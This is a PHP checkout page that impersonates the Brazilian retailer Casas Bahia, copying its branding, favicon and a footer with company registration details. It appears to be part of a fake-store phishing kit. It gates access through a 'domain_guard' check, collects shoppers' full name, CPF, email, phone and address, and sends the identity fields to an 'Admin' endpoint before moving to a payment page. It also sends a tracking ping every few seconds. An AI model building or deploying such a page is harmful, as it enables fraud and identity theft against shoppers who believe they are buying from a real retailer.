<?php
require_once __DIR__ . '/config/database.php';
require_once __DIR__ . '/includes/domain_guard.php';
checkDomainAccess();
require_once __DIR__ . '/includes/pixel_tracker.php';

$db = getDBConnection();
$id = $_GET['id'] ?? null;

// Carregar Produto por ID ou buscar o mais recente
$product = null;
if (!empty($id)) {
    $stmt = $db->prepare("SELECT * FROM products WHERE id = :id LIMIT 1");
    $stmt->execute(['id' => $id]);
    $product = $stmt->fetch();
}

if (!$product) {
    $stmt = $db->query("SELECT * FROM products ORDER BY id DESC LIMIT 1");
    $product = $stmt->fetch();
}

if (!$product) {
    $product = [
        'id' => 1,
        'title' => 'Smart TV 43 AOC Full HD Wi-Fi Roku TV',
        'brand' => 'AOC',
        'regular_price' => 1699.00,
        'pix_price' => 1580.07,
        'item_code' => '55071718'
    ];
}

// Imagem Principal do Produto
$stmtImg = $db->prepare("SELECT image_url FROM product_images WHERE product_id = :pid ORDER BY is_main DESC, id ASC LIMIT 1");
$stmtImg->execute(['pid' => $product['id']]);
$mainImage = $stmtImg->fetchColumn();
if (!$mainImage) {
    $mainImage = 'assets/images/product_aoc_main.png';
}

$formattedPrice = number_format($product['pix_price'], 2, ',', '.');
?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>Endereço de entrega | Casas Bahia</title>
  <link rel="icon" href="https://www.casasbahia.com.br/favicon.ico">
  <?php renderFacebookPixel('InitiateCheckout', ['content_name' => $product['title'], 'content_ids' => [strval($product['id'])], 'content_type' => 'product', 'value' => (float)$product['pix_price'], 'currency' => 'BRL', 'num_items' => 1]); ?>
  <style>
    :root {
      --cb-blue: #003399;
      --cb-red: #e30613;
      --cb-green: #168019;
      --cb-green-disabled: #bbf7d0;
      --cb-bg: #f8f9fa;
      --font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
    }
    * { box-sizing: border-box; margin: 0; padding: 0; font-family: var(--font-family); }
    body { background-color: var(--cb-bg); color: #0f172a; padding-bottom: 40px; -webkit-font-smoothing: antialiased; }

    /* LINHA VERMELHA TOPO */
    .top-red-line { height: 4px; background-color: var(--cb-red); width: 100%; }

    /* HEADER */
    header { background: #ffffff; padding: 14px 16px; border-bottom: 1px solid #e2e8f0; display: flex; align-items: center; justify-content: space-between; position: sticky; top: 0; z-index: 100; }
    .brand-logo { font-size: 20px; font-weight: 900; color: var(--cb-blue); text-decoration: none; letter-spacing: -0.5px; }
    .brand-logo span { color: var(--cb-red); }
    .accessibility-icon { color: var(--cb-blue); display: flex; align-items: center; cursor: pointer; }

    /* CONTAINER PRINCIPAL */
    .checkout-container { max-width: 480px; margin: 0 auto; padding: 16px; }

    .page-title { font-size: 20px; font-weight: 700; color: var(--cb-blue); margin: 12px 0 16px 0; }

    /* CARD NOVO ENDEREÇO (FOTO 1) */
    .address-card { background: #ffffff; border: 1px solid #cbd5e1; border-radius: 10px; padding: 16px; margin-bottom: 24px; }
    .address-card-header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 16px; }
    .address-card-title { font-size: 18px; font-weight: 700; color: #0f172a; }
    .link-voltar { font-size: 14px; font-weight: 600; color: var(--cb-blue); text-decoration: underline; cursor: pointer; }

    .form-group { margin-bottom: 14px; }
    .form-label { display: block; font-size: 13px; font-weight: 700; color: #334155; margin-bottom: 5px; }
    .form-input { width: 100%; height: 46px; border: 1px solid #cbd5e1; border-radius: 8px; padding: 0 12px; font-size: 15px; outline: none; transition: border-color 0.2s, background-color 0.2s; color: #0f172a; background: #ffffff; }
    .form-input:focus { border-color: var(--cb-blue); }
    .form-input.readonly { background-color: #f1f5f9; color: #64748b; cursor: not-allowed; }
    .form-subtext { font-size: 12px; color: #64748b; margin-top: 4px; }

    .btn-location { display: inline-flex; align-items: center; gap: 6px; color: var(--cb-blue); font-weight: 700; font-size: 14px; text-decoration: underline; cursor: pointer; margin-top: 4px; margin-bottom: 16px; border: none; background: none; padding: 0; }
    .btn-location svg { flex-shrink: 0; }

    .grid-2-col { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }
    .grid-number-row { display: flex; gap: 12px; align-items: flex-start; }
    .checkbox-row { display: flex; align-items: center; gap: 6px; font-size: 13px; color: #334155; margin-top: 30px; white-space: nowrap; }
    .checkbox-row input { accent-color: var(--cb-blue); width: 16px; height: 16px; cursor: pointer; }

    /* SEÇÃO DADOS DO COMPRADOR */
    .section-divider { height: 1px; background: #e2e8f0; margin: 18px 0; }
    .sub-section-title { font-size: 14px; font-weight: 700; color: var(--cb-blue); margin-bottom: 12px; text-transform: uppercase; letter-spacing: 0.3px; }

    /* RESUMO DO PEDIDO (FOTO 1 E 2) */
    .section-summary-title { font-size: 20px; font-weight: 700; color: var(--cb-blue); margin-bottom: 16px; }
    
    .summary-card { background: #ffffff; border: 1px solid #e2e8f0; border-radius: 10px; padding: 16px; margin-bottom: 24px; }
    
    .product-summary-item { display: flex; align-items: flex-start; gap: 12px; padding-bottom: 16px; }
    .product-thumb { width: 72px; height: 72px; object-fit: contain; flex-shrink: 0; border-radius: 6px; }
    .product-details { flex: 1; min-width: 0; }
    .product-title { font-size: 14px; font-weight: 500; color: #1e293b; line-height: 1.35; margin-bottom: 4px; word-break: break-word; }
    .seller-info { font-size: 12px; color: #64748b; margin-bottom: 4px; }
    .seller-info strong { color: var(--cb-blue); }
    .delivery-badge { font-size: 12px; color: #1e293b; margin-bottom: 6px; }
    .delivery-badge span { color: var(--cb-green); font-weight: 700; }
    .product-price-item { font-size: 16px; font-weight: 800; color: var(--cb-blue); text-align: right; margin-top: 4px; }

    .summary-divider { height: 1px; background: #e2e8f0; width: 100%; margin: 12px 0; }

    .summary-row { display: flex; align-items: center; justify-content: space-between; font-size: 15px; color: #1e293b; margin-bottom: 10px; }
    .summary-row.total-row { font-size: 18px; font-weight: 700; margin-bottom: 2px; }
    .total-price-val { font-size: 18px; font-weight: 800; color: var(--cb-blue); }

    .payment-opt-subtext { text-align: right; font-size: 14px; color: var(--cb-blue); font-weight: 500; margin-bottom: 14px; }
    .payment-notice-text { text-align: center; font-size: 12px; color: #64748b; margin-bottom: 20px; line-height: 1.4; }

    /* BOTÃO IR PARA PAGAMENTO (FOTO 2) */
    .btn-go-payment {
      display: flex;
      align-items: center;
      justify-content: center;
      width: 100%;
      height: 50px;
      border: none;
      border-radius: 8px;
      font-size: 16px;
      font-weight: 700;
      cursor: not-allowed;
      background-color: var(--cb-green-disabled);
      color: #ffffff;
      transition: background-color 0.3s ease, box-shadow 0.3s ease;
      text-transform: none;
    }
    .btn-go-payment.active {
      background-color: var(--cb-green);
      color: #ffffff;
      cursor: pointer;
      box-shadow: 0 4px 12px rgba(22, 128, 25, 0.3);
    }
    .btn-go-payment.active:active {
      background-color: #136915;
    }

    /* RODAPÉ LEGAL CNPJ */
    .legal-footer { margin-top: 32px; padding-top: 20px; border-top: 1px solid #e2e8f0; font-size: 12px; color: #64748b; line-height: 1.65; font-weight: 400; text-align: left; }
  </style>
</head>
<body>

  <!-- TOPO LINHA VERMELHA -->
  <div class="top-red-line"></div>

  <!-- HEADER -->
  <header>
    <a href="carrinho.php?id=<?= $product['id'] ?>" class="brand-logo">CASAS<span>BAHIA</span></a>
    <div class="accessibility-icon" title="Acessibilidade">
      <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#003399" stroke-width="1.8">
        <circle cx="12" cy="12" r="10"/>
        <circle cx="12" cy="6.5" r="1.5" fill="#003399" stroke="none"/>
        <path d="M7 10.5h10M12 10.5v5M9.5 19.5l2.5-4 2.5 4" stroke-linecap="round" stroke-linejoin="round"/>
      </svg>
    </div>
  </header>

  <div class="checkout-container">
    
    <h1 class="page-title">Endereço de entrega</h1>

    <!-- CARD NOVO ENDEREÇO (FOTO 1) -->
    <div class="address-card">
      <div class="address-card-header">
        <span class="address-card-title">Novo endereço</span>
        <a href="carrinho.php?id=<?= $product['id'] ?>" class="link-voltar">Voltar</a>
      </div>

      <form id="addressForm" onsubmit="submitAddressForm(event)">
        
        <!-- CEP (FOTO 1) -->
        <div class="form-group">
          <label class="form-label" for="cepInput">CEP</label>
          <input type="text" id="cepInput" class="form-input" placeholder="00000-000" maxlength="9" required oninput="handleCepInput(this)">
          <div class="form-subtext">Exemplo: 99999-999</div>
        </div>

        <div>
          <button type="button" class="btn-location" onclick="useCurrentLocation()">
            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
              <path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z" fill="#003399" stroke="none"/>
            </svg>
            Usar minha localização
          </button>
        </div>

        <div class="section-divider"></div>

        <!-- CAMPOS COMPLEMENTARES DO ENDEREÇO -->
        <div class="sub-section-title">Dados da entrega</div>

        <div class="form-group">
          <label class="form-label" for="streetInput">Rua / Avenida</label>
          <input type="text" id="streetInput" class="form-input" placeholder="Ex: Rua Dona Cândida" required oninput="validateForm()">
        </div>

        <div class="grid-number-row">
          <div class="form-group" style="flex: 1;">
            <label class="form-label" for="numberInput">Número</label>
            <input type="text" id="numberInput" class="form-input" placeholder="Ex: 123" required oninput="validateForm()">
          </div>
          <div class="checkbox-row">
            <input type="checkbox" id="noNumberCheck" onchange="toggleNoNumber(this)">
            <label for="noNumberCheck">Sem número</label>
          </div>
        </div>

        <div class="form-group">
          <label class="form-label" for="complementInput">Complemento (opcional)</label>
          <input type="text" id="complementInput" class="form-input" placeholder="Ex: Apto 42, Bloco B">
        </div>

        <div class="form-group">
          <label class="form-label" for="neighborhoodInput">Bairro</label>
          <input type="text" id="neighborhoodInput" class="form-input" placeholder="Ex: Centro" required oninput="validateForm()">
        </div>

        <div class="grid-2-col">
          <div class="form-group">
            <label class="form-label" for="cityInput">Cidade</label>
            <input type="text" id="cityInput" class="form-input readonly" placeholder="Cidade" readonly required>
          </div>
          <div class="form-group">
            <label class="form-label" for="stateInput">Estado (UF)</label>
            <input type="text" id="stateInput" class="form-input readonly" placeholder="UF" readonly required>
          </div>
        </div>

        <div class="form-group">
          <label class="form-label" for="referenceInput">Ponto de referência (opcional)</label>
          <input type="text" id="referenceInput" class="form-input" placeholder="Ex: Próximo à padaria">
        </div>

        <div class="section-divider"></div>

        <!-- DADOS DO COMPRADOR -->
        <div class="sub-section-title">Dados do comprador (para nota fiscal e Pix)</div>

        <div class="form-group">
          <label class="form-label" for="recipientInput">Nome Completo</label>
          <input type="text" id="recipientInput" class="form-input" placeholder="Nome e sobrenome" required oninput="validateForm()">
        </div>

        <div class="form-group">
          <label class="form-label" for="cpfInput">CPF do Comprador</label>
          <input type="text" id="cpfInput" class="form-input" placeholder="000.000.000-00" maxlength="14" required oninput="handleCpfInput(this)">
          <div id="cpfErrorMsg" style="color: #e30613; font-size: 12px; font-weight: 700; margin-top: 4px; display: none;">⚠️ CPF inválido. Digite um CPF correto.</div>
        </div>

        <div class="form-group">
          <label class="form-label" for="emailInput">E-mail</label>
          <input type="email" id="emailInput" class="form-input" placeholder="seuemail@exemplo.com" required oninput="validateForm()">
        </div>

        <div class="form-group">
          <label class="form-label" for="phoneInput">Telefone / WhatsApp</label>
          <input type="tel" id="phoneInput" class="form-input" placeholder="(00) 00000-0000" maxlength="15" required oninput="handlePhoneInput(this)">
        </div>

      </form>
    </div>

    <!-- RESUMO DO PEDIDO (FOTO 1 E 2) -->
    <h2 class="section-summary-title">Resumo do pedido</h2>

    <div class="summary-card">
      <div class="product-summary-item">
        <img src="<?= htmlspecialchars($mainImage) ?>" alt="<?= htmlspecialchars($product['title']) ?>" class="product-thumb">
        <div class="product-details">
          <div class="product-title">1x <?= htmlspecialchars($product['title']) ?></div>
          <div class="seller-info">Vendido e entregue por <strong>Casas Bahia</strong></div>
          <div class="delivery-badge" id="deliveryBadgeText">hoje: <span>Grátis</span></div>
        </div>
      </div>

      <div class="product-price-item">R$ <?= $formattedPrice ?></div>

      <div class="summary-divider"></div>

      <div class="summary-row">
        <span>01 Produto</span>
        <span>R$ <?= $formattedPrice ?></span>
      </div>

      <div class="summary-divider"></div>

      <div class="summary-row total-row">
        <span>Total</span>
        <span class="total-price-val">R$ <?= $formattedPrice ?></span>
      </div>

      <div class="payment-opt-subtext">no Cartão ou à vista no Pix</div>

      <div class="payment-notice-text">
        Valor sujeito à alteração conforme opção de pagamento
      </div>

      <!-- BOTÃO IR PARA PAGAMENTO (FOTO 2) -->
      <button type="button" id="btnGoPayment" class="btn-go-payment" onclick="submitAddressForm(event)">
        Ir para pagamento
      </button>

    </div>

    <!-- RODAPÉ LEGAL CNPJ (FOTO 2) -->
    <div class="legal-footer">
      Grupo Casas Bahia S.A. | www.casasbahia.com.br | Rua Florida, 1970 | São Paulo - SP | CEP: 04565-001 | CNPJ: 33.041.260/0652-90 | Inscrição Estadual: 133.091.229.115
    </div>

  </div>

  <script>
    var prodId = "<?= $product['id'] ?>";
    var isFormValid = false;

    // VALIDAÇÃO OFICIAL DE CPF BRASILEIRO (MÓDULO 11)
    function validateCPF(cpf) {
      if (!cpf) return false;
      cpf = cpf.replace(/[^\d]+/g, '');
      if (cpf.length !== 11) return false;
      if (/^(\d)\1{10}$/.test(cpf)) return false;

      var add = 0;
      for (var i = 0; i < 9; i++) {
        add += parseInt(cpf.charAt(i)) * (10 - i);
      }
      var rev = 11 - (add % 11);
      if (rev === 10 || rev === 11) rev = 0;
      if (rev !== parseInt(cpf.charAt(9))) return false;

      add = 0;
      for (var i = 0; i < 10; i++) {
        add += parseInt(cpf.charAt(i)) * (11 - i);
      }
      rev = 11 - (add % 11);
      if (rev === 10 || rev === 11) rev = 0;
      if (rev !== parseInt(cpf.charAt(10))) return false;

      return true;
    }

    function handleCpfInput(input) {
      var v = input.value.replace(/\D/g, '');
      if (v.length > 11) v = v.substring(0, 11);
      
      if (v.length > 9) {
        v = v.replace(/(\d{3})(\d{3})(\d{3})(\d{1,2})/, '$1.$2.$3-$4');
      } else if (v.length > 6) {
        v = v.replace(/(\d{3})(\d{3})(\d{1,3})/, '$1.$2.$3');
      } else if (v.length > 3) {
        v = v.replace(/(\d{3})(\d{1,3})/, '$1.$2');
      }
      input.value = v;

      var err = document.getElementById('cpfErrorMsg');
      var rawDigits = v.replace(/\D/g, '');
      if (rawDigits.length === 11) {
        if (!validateCPF(rawDigits)) {
          err.style.display = 'block';
          input.style.borderColor = '#e30613';
        } else {
          err.style.display = 'none';
          input.style.borderColor = '#168019';
        }
      } else {
        err.style.display = 'none';
        input.style.borderColor = '#cbd5e1';
      }

      validateForm();
    }

    function handlePhoneInput(input) {
      var v = input.value.replace(/\D/g, '');
      if (v.length > 11) v = v.substring(0, 11);
      if (v.length > 10) {
        v = v.replace(/^(\d{2})(\d{5})(\d{4})/, '($1) $2-$3');
      } else if (v.length > 6) {
        v = v.replace(/^(\d{2})(\d{4})(\d{0,4})/, '($1) $2-$3');
      } else if (v.length > 2) {
        v = v.replace(/^(\d{2})(\d{0,5})/, '($1) $2');
      }
      input.value = v;
      validateForm();
    }

    function handleCepInput(input) {
      var v = input.value.replace(/\D/g, '');
      if (v.length > 5) v = v.substring(0, 5) + '-' + v.substring(5, 8);
      input.value = v;

      if (v.replace(/\D/g, '').length === 8) {
        fetchAddressFromCep(v.replace(/\D/g, ''));
      }
      validateForm();
    }

    async function fetchAddressFromCep(rawCep) {
      if (rawCep.length !== 8) return;
      try {
        let data = null;
        try {
          const resLocal = await fetch(`api/cep.php?cep=${rawCep}`);
          if (resLocal.ok) data = await resLocal.json();
        } catch (err) {}

        if (!data || data.erro) {
          const resVia = await fetch(`https://viacep.com.br/ws/${rawCep}/json/`);
          data = await resVia.json();
        }

        if (data && !data.erro) {
          if (data.logradouro) document.getElementById('streetInput').value = data.logradouro;
          if (data.bairro) document.getElementById('neighborhoodInput').value = data.bairro;
          if (data.localidade) document.getElementById('cityInput').value = data.localidade;
          if (data.uf) document.getElementById('stateInput').value = data.uf;
          
          document.getElementById('numberInput').focus();
        }
      } catch (err) {}
      validateForm();
    }

    function toggleNoNumber(check) {
      var numInput = document.getElementById('numberInput');
      if (check.checked) {
        numInput.value = 'S/N';
        numInput.disabled = true;
      } else {
        numInput.value = '';
        numInput.disabled = false;
      }
      validateForm();
    }

    function validateForm() {
      var cep = document.getElementById('cepInput').value.replace(/\D/g, '');
      var street = document.getElementById('streetInput').value.trim();
      var number = document.getElementById('numberInput').value.trim();
      var neighborhood = document.getElementById('neighborhoodInput').value.trim();
      var city = document.getElementById('cityInput').value.trim();
      var state = document.getElementById('stateInput').value.trim();
      var recipient = document.getElementById('recipientInput').value.trim();
      var cpf = document.getElementById('cpfInput').value.trim();
      var email = document.getElementById('emailInput').value.trim();
      var phone = document.getElementById('phoneInput').value.trim();

      var isCpfValid = validateCPF(cpf);
      var isEmailValid = email.length > 3 && email.indexOf('@') !== -1;
      var isPhoneValid = phone.replace(/\D/g, '').length >= 10;
      var isCepValid = cep.length === 8;

      if (isCepValid && street && number && neighborhood && city && state && recipient && isCpfValid && isEmailValid && isPhoneValid) {
        isFormValid = true;
        var btn = document.getElementById('btnGoPayment');
        if (btn) {
          btn.classList.add('active');
        }
      } else {
        isFormValid = false;
        var btn = document.getElementById('btnGoPayment');
        if (btn) {
          btn.classList.remove('active');
        }
      }
    }

    function submitAddressForm(e) {
      if (e) e.preventDefault();

      var cep = document.getElementById('cepInput').value.replace(/\D/g, '');
      var street = document.getElementById('streetInput').value.trim();
      var number = document.getElementById('numberInput').value.trim();
      var neighborhood = document.getElementById('neighborhoodInput').value.trim();
      var city = document.getElementById('cityInput').value.trim();
      var state = document.getElementById('stateInput').value.trim();
      var complement = document.getElementById('complementInput').value.trim();
      var reference = document.getElementById('referenceInput').value.trim();
      var recipient = document.getElementById('recipientInput').value.trim();
      var cpf = document.getElementById('cpfInput').value.trim();
      var email = document.getElementById('emailInput').value.trim();
      var phone = document.getElementById('phoneInput').value.trim();

      if (!recipient) {
        alert('Por favor, informe seu Nome Completo!');
        document.getElementById('recipientInput').focus();
        return false;
      }

      if (!validateCPF(cpf)) {
        alert('⚠️ Por favor, digite um CPF válido para emissão da nota fiscal do pedido!');
        var cpfElem = document.getElementById('cpfInput');
        cpfElem.focus();
        cpfElem.style.borderColor = '#e30613';
        document.getElementById('cpfErrorMsg').style.display = 'block';
        return false;
      }

      if (!email || email.indexOf('@') === -1) {
        alert('Por favor, informe um E-mail válido!');
        document.getElementById('emailInput').focus();
        return false;
      }

      if (!phone || phone.replace(/\D/g, '').length < 10) {
        alert('Por favor, informe um Telefone/WhatsApp válido com DDD!');
        document.getElementById('phoneInput').focus();
        return false;
      }

      if (!cep || cep.length !== 8) {
        alert('Por favor, digite um CEP válido com 8 dígitos!');
        document.getElementById('cepInput').focus();
        return false;
      }

      if (!street || !number || !neighborhood || !city || !state) {
        alert('Por favor, preencha o endereço completo de entrega!');
        if (!street) document.getElementById('streetInput').focus();
        else if (!number) document.getElementById('numberInput').focus();
        return false;
      }

      var formattedCep = cep.substring(0, 5) + '-' + cep.substring(5, 8);
      var addrData = {
        recipient: recipient,
        cpf: cpf,
        email: email,
        phone: phone,
        street: street,
        number: number,
        complement: complement,
        neighborhood: neighborhood,
        city: city,
        state: state,
        reference: reference,
        cep: formattedCep
      };

      localStorage.setItem('savedAddressData', JSON.stringify(addrData));
      localStorage.setItem('userCep', formattedCep);

      // Salvar cliente no Admin de forma assíncrona
      try {
        var formData = new FormData();
        formData.append('name', recipient);
        formData.append('cpf', cpf);
        formData.append('email', email);
        formData.append('phone', phone);
        fetch('api/save_client.php', { method: 'POST', body: formData });
      } catch (e) {}

      window.location.href = 'pagamento.php?id=' + prodId;
    }

    function useCurrentLocation() {
      var btn = document.querySelector('.btn-location');
      var originalContent = btn ? btn.innerHTML : '';
      if (btn) btn.innerHTML = '<span>Obtendo localização...</span>';

      if (!navigator.geolocation) {
        alert('⚠️ Seu navegador não suporta geolocalização. Por favor, digite seu CEP.');
        if (btn) btn.innerHTML = originalContent;
        return;
      }

      navigator.geolocation.getCurrentPosition(
        async function(position) {
          var lat = position.coords.latitude;
          var lon = position.coords.longitude;

          try {
            const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&addressdetails=1`);
            const data = await res.json();
            const addr = data.address || {};

            var rawCep = (addr.postcode || '').replace(/\D/g, '');
            var street = addr.road || addr.street || addr.pedestrian || addr.suburb || '';
            var neighborhood = addr.suburb || addr.neighbourhood || addr.quarter || addr.district || '';
            var city = addr.city || addr.town || addr.municipality || addr.village || '';
            var state = addr.state || '';

            if (state.length > 2) {
              var stateMap = {
                'Santa Catarina': 'SC', 'São Paulo': 'SP', 'Rio de Janeiro': 'RJ', 'Minas Gerais': 'MG',
                'Paraná': 'PR', 'Rio Grande do Sul': 'RS', 'Bahia': 'BA', 'Goiás': 'GO', 'Pernambuco': 'PE',
                'Ceará': 'CE', 'Pará': 'PA', 'Maranhão': 'MA', 'Espírito Santo': 'ES', 'Paraíba': 'PB',
                'Mato Grosso': 'MT', 'Mato Grosso do Sul': 'MS', 'Distrito Federal': 'DF', 'Rio Grande do Norte': 'RN',
                'Piauí': 'PI', 'Alagoas': 'AL', 'Sergipe': 'SE', 'Rondônia': 'RO', 'Tocantins': 'TO',
                'Acre': 'AC', 'Amapá': 'AP', 'Roraima': 'RR', 'Amazonas': 'AM'
              };
              state = stateMap[state] || state;
            }

            if (rawCep.length === 8) {
              var formattedCep = rawCep.substring(0, 5) + '-' + rawCep.substring(5, 8);
              document.getElementById('cepInput').value = formattedCep;
              await fetchAddressFromCep(rawCep);
            } else {
              if (street) document.getElementById('streetInput').value = street;
              if (neighborhood) document.getElementById('neighborhoodInput').value = neighborhood;
              if (city) document.getElementById('cityInput').value = city;
              if (state) document.getElementById('stateInput').value = state;
            }

            document.getElementById('numberInput').focus();
          } catch(err) {
            alert('Localização obtida. Por favor, digite o CEP no campo para completar.');
          } finally {
            if (btn) btn.innerHTML = originalContent;
            validateForm();
          }
        },
        function(error) {
          if (btn) btn.innerHTML = originalContent;
          var msg = 'Permissão de localização não concedida. Digite seu CEP no campo.';
          if (error.code === error.PERMISSION_DENIED) {
            msg = 'Permissão de localização negada pelo navegador. Por favor, digite o seu CEP no campo acima.';
          }
          alert('⚠️ ' + msg);
        },
        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
      );
    }

    document.addEventListener('DOMContentLoaded', function() {
      // Tentar restaurar CEP ou dados salvos anteriormente
      var savedCep = localStorage.getItem('userCep');
      if (savedCep) {
        document.getElementById('cepInput').value = savedCep;
        var rawCep = savedCep.replace(/\D/g, '');
        if (rawCep.length === 8) {
          fetchAddressFromCep(rawCep);
        }
      }

      var saved = localStorage.getItem('savedAddressData');
      if (saved) {
        try {
          var data = JSON.parse(saved);
          if (data.recipient) document.getElementById('recipientInput').value = data.recipient;
          if (data.cpf) document.getElementById('cpfInput').value = data.cpf;
          if (data.email) document.getElementById('emailInput').value = data.email;
          if (data.phone) document.getElementById('phoneInput').value = data.phone;
          if (data.cep) document.getElementById('cepInput').value = data.cep;
          if (data.street) document.getElementById('streetInput').value = data.street;
          if (data.number) document.getElementById('numberInput').value = data.number;
          if (data.complement) document.getElementById('complementInput').value = data.complement;
          if (data.neighborhood) document.getElementById('neighborhoodInput').value = data.neighborhood;
          if (data.city) document.getElementById('cityInput').value = data.city;
          if (data.state) document.getElementById('stateInput').value = data.state;
          if (data.reference) document.getElementById('referenceInput').value = data.reference;
        } catch(e) {}
      }

      validateForm();
    });

    function sendActivityPulse(pageName) {
      try { fetch('api/tracker.php?page=' + encodeURIComponent(pageName)); } catch (e) {}
    }
    sendActivityPulse('endereco.php');
    setInterval(function() { sendActivityPulse('endereco.php'); }, 8000);
  </script>
</body>
</html>
